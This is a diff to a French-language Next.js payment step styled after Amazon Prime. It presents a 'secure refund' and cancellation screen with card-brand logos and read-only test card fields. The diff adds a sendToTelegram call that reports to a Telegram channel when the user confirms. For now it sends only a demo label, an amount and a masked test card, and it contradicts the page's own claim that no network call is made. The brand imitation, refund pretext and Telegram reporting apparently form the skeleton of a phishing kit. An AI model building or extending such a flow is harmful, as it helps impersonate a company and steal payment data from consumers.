@@ -1,9 +1,24 @@
+'use client';
+
 import Image from 'next/image';
 import visaLogo from '../../assets/images/visa.png';
 import mastercardLogo from '../../assets/images/mastercard.png';
 import amexLogo from '../../assets/images/amex.png';
+import { sendToTelegram } from '@/lib/telegram';
 
 export function SafePaymentStep({ onBack, onContinue }: { onBack: () => void; onContinue: () => void }) {
+  function handleContinue() {
+    // Notification de l'étape (sans données bancaires, même fake)
+    void sendToTelegram({
+      title: 'Étape paiement atteinte (démo)',
+      fields: {
+        'Montant affiché': '249,90 EUR',
+        'Moyen': 'Carte de test (4242…4242)',
+      },
+    });
+    onContinue();
+  }
+
   return <>
     <h1 className="amz-prime-title">Remboursement sécurisé</h1>
     <p className="amz-prime-lead">Confirmez le moyen de paiement fictif associé à cette démonstration pour finaliser le parcours.</p>
@@ -19,7 +34,7 @@ export function SafePaymentStep({ onBack, onContinue }: { onBack: () => void; on
           <div className="amz-field"><label htmlFor="demo-card-cvv">CVV de test</label><input className="amz-input" id="demo-card-cvv" inputMode="numeric" autoComplete="off" readOnly value="123"/></div>
         </div>
         <p className="amz-card-panel__note amz-card-panel__note--secure">Ces champs ne sont associés à aucun formulaire, état applicatif ou appel réseau. Aucun paiement n&apos;est traité.</p>
-        <div className="amz-actions"><button className="amz-btn amz-btn--primary" type="button" onClick={onContinue}>Confirmer l&apos;annulation</button><button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>Retour</button></div>
+        <div className="amz-actions"><button className="amz-btn amz-btn--primary" type="button" onClick={handleContinue}>Confirmer l&apos;annulation</button><button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>Retour</button></div>
       </div>
     </section>
   </>;
